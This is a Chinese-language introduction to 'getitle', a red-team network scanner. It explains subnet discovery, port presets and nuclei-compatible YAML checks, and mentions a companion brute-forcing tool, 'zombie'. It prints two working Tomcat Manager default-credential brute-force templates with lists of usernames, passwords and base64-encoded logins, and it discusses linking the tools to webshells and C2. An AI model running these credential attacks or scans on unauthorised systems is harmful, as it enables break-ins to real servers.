## start

在设计文档1-5中详细介绍了为什么要这么设计, 以及一些比较深层的原理和用法, 但是并不是每个人都有耐心看完. 

因此, 有写了这篇关于为什么要使用getitle的介绍, 如果看完这篇觉得getitle有潜力, 再去深入了解相关设计,拓展编写以及深入使用技巧.

本文会结合实战介绍getitle的用法.

## 0x01 诞生

在红队最开始的两年, 并没有相关的工具, 外网扫描端口使用的还是nmap, masscan. 内网则几乎无能为力, 有人使用C写的一些小工具, 有人通过python写了单文件的allin, 也有人打包了单文件版本的nmap与masscan.

之后才有serverscan, 不过serverscan的设计上存在缺陷, 在扫描少量目标时效果不错, 目标一大, 则速度难以接受.

再后来, 才有了fscan, kscan等等适合红队, 护网场景的扫描器, 技术栈几乎统一到go, 少量工具使用rust.

而getitle, 但是与fscan第一个commit前的半年, 一直在内部使用迭代. 最开始也尝试了,C# python 等技术栈, 走了些弯路, 当很快确定到go.

超强的并发调度, 较低的学习成本, 很快就在同事手中诞生了第一个demo, 那时候的getitle真的只能get title, 后来加入了非常多功能以及优化, 当名字没再修改. 我倒是考虑到改成gauss之类的,但用习惯了,也懒得修改.

## 0x02 特点

很多功能并不是一开始就有的, 但是我根据自评的使用频率排序来介绍getitle.

### 启发式扫描
在nmap,masscan那个年代, 对内网的扫描很少会超过c段, 更别说a段这种在当时几乎不可能完成的任务. 

就算是现在的fscan, 或者相关特化的工具netspy中, 也不能很好的时间, 在我认为也只是一个demo.

而getitle在很早就集成了根据经验公式的递归下降, 去发现网段. 并且通过生成器对扫描逻辑解耦, 几乎可以单独使用在任意一阶段. 例如

* 想绘制一下当前入口点能通的网络拓扑 (大约30分钟)
* 只想看看10段内网里有多个B段被使用了 (大约30秒)
* 只想看看10网段中有多少ip存活 (大约30分钟)
* 想扫描下10段中的资产 (看前两阶段存活的资产数量, 大约1-2小时)
* 不仅想扫描资产, 还想识别下指纹, 探测下漏洞 (基本和探测资产时间相同, 采用最小发包原则,探测指纹与漏洞不会多耗时多少, 大约多20-30%耗时)
* 我想一口气把10,172,192内网全探测了, 并输出报告 (看资产数量, 大约1-2小时)

当然, 这里的网段可以自定义, 不一定是10

启发式扫描大致可以理解为这些用法, 还有更多的拓展用法可以看这张图.

[!](img/pipeline.png)

### 端口配置

刚才提到的启发式扫描, 主要是在扫描逻辑上的配置, 而对于具体端口资产, getitle也提供了及其方便的端口预设, 

例如我要扫描常见的http服务, 指定`-p top3` 或 `-p top2` 即可. 如果要扫描数据库, 则是`-p db`

如果我同时要使用多个预设, 那么`-p top3,db,win`

如果我要使用多个预设, 又要指定某个区间网段. 那么 `-p top3,db,win,40000-50000`

如果要自己添加预设, 去github的template添加即可. 通过name与tags的交叉管理, 使用起来极为方便.


### 指纹识别与漏洞探测

getitle的指纹与漏洞都将以完全的dsl语言的方式实现, 说人话就是 通过yaml配置.

指纹是我自研的规则库和格式, 因为并没有找到一个完全能满足我需求的规则库, 因此我自己写了一个, 整合了fofa的规则库, 以及fingerprinthub, fscan, kscan, allin中的一部分规则.

而漏洞则是与nuclei的规则一致, 考虑到了内网环境, 我删除了一部分不重要的功能, 以简化二进制文件大小. 

基本上可以从nuclei中移植poc, 只需要删除一些无用信息便可以快速加入到getitle中.

举个例子.
这是nuclei的tomcat默认漏洞登录poc
```
id: tomcat-default-login

info:
  name: ApahceTomcat Manager Default Login
  author: pdteam
  severity: high
  description: Apache Tomcat Manager default login credentials were discovered. This template checks for multiple variations.
  reference:
    - https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/
  tags: tomcat,apache,default-login

requests:
  - raw:
      - |
        GET /manager/html HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
    payloads:
      username:
        - tomcat
        - admin
        - ovwebusr
        - j2deployer
        - cxsdk
        - ADMIN
        - xampp
        - tomcat
        - QCC
        - admin
        - root
        - role1
        - role
        - tomcat
        - admin
        - role1
        - both
        - admin

      password:
        - tomcat
        - admin
        - OvW*busr1
        - j2deployer
        - kdsxc
        - ADMIN
        - xampp
        - s3cret
        - QLogic66
        - tomcat
        - root
        - role1
        - changethis
        - changethis
        - j5Brn9
        - tomcat
        - tomcat
        - 123456

    attack: pitchfork  # Available options: sniper, pitchfork and clusterbomb

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Apache Tomcat"
          - "Server Information"
          - "Hostname"
        condition: and

      - type: status
        status:
          - 200
```

这是getitle中移植修改完的:
```
id: tomcat-manager-login
info:
  author: pdteam
  name: tomcat-manager-default-password
  severity: high
  tags: tomcat-manager
requests:
  - raw:
      - |
        GET /manager/html HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{auth}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0
    attack: sniper
    stop-at-first-match: true
    matchers:
      - status:
          - 200
        type: status
      - type: word
        words:
          - Apache Tomcat
    extractors:
      - type: regex
        name: cookie
        internal: true
        part: header
        regex:
          - 'JSESSIONID\..*=([a-z0-9.]+)'
    matchers-condition: and
    payloads:
      auth:
        - dG9tY2F0OnRvbWNhdA==
        - dG9tY2F0OnMzY3JldA==
        - YWRtaW46YWRtaW4=
        - b3Z3ZWJ1c3I6T3ZXKmJ1c3Ix
        - ajJkZXBsb3llcjpqMmRlcGxveWVy
        - Y3hzZGs6a2RzeGM=
        - QURNSU46QURNSU4=
        - eGFtcHA6eGFtcHA=
        - UUNDOlFMb2dpYzY2
        - YWRtaW46dG9tY2F0
        - cm9vdDpyb290
        - cm9sZTE6cm9sZTE=
        - cm9sZTpjaGFuZ2V0aGlz
        - dG9tY2F0OmNoYW5nZXRoaXM=
        - YWRtaW46ajVCcm45
        - cm9sZTE6dG9tY2F0
```

因为我删除了动态的dsl生成(加上这个二进制会大一倍), 所以修改的只是编码后的auth字段. 如果poc中原来没有这种动态dsl, 那么几乎不需要修改.

我想通过兼容nuclei的生态, 让自己维护poc库省力一些, 现在基本处于有人反馈常见什么poc, 我就添加对应的poc, 经过一段时间的维护, 基本上常见的poc都能适配好. 需要各位大哥帮我实现.

这里你也会发现, 内网除了自动化打一些poc, 还可以把默认口令这部分给实现了, 一些常见的网络设备web端, web应用, 不再需要手动测试. 与其维护一个默认口令库, 不如直接自动化探测.

当然也支持自定义口令的批量爆破, 不过使用相对复杂, 属于进阶用法, 请详细阅读设计文档.

### 服务的口令爆破
刚才提到了, 对web端默认口令的爆破getitle可以实现, 有很多人问我, 为什么不把ssh, mysql之类的爆破也做进去. 

最初我也是这么想的, 但是考虑到加上了这些功能, 二进制文件和代码会变得臃肿. 不如另起炉灶, 因此我们维护了另外一个工具 zombie.

zombie能做的不仅仅是口令的爆破, 还可以实现一些自动化的利用, 比如mysql爆破之后, 判断下是否是root, 有多少数据, 自定义的命令批量执行等等功能. 批量的rce更不是梦, 不过需要做的兼容性处理比较多, 属于远期目标

让护网不再是一个一个登录上去截图, 而是getitle与zombie的快乐联动, 内网刷分, 一行命令!

getitle结果可以直接导入到zombie. 不一定是内网命令行的联动, 因为大多数爆破场景其实并发要求不高, 甚至可以通过代理操作, 而不上传臃肿的zombie. 

在未来, 我打算编写一个gui界面的结果解析器与联动工具, 也可以是与c2 webshell的联动, 进一步简化操作, 让getitle与zombie的联动无缝衔接.


### 未来展望

1. 集成到自动化外网信息收集工具, 与图数据库相结合 (已经做了一部分)
2. 自动收集结果, 以可视化报告的形式呈现 (已经做了一部分)
3. 与webshell, c2工具联动, 实现图形化 一键使用 (已经做了一部分)
4. 内网分布式部署, 多点同时扫描
5. agent化, 特殊网络环境下, 可以只上传tiny agent

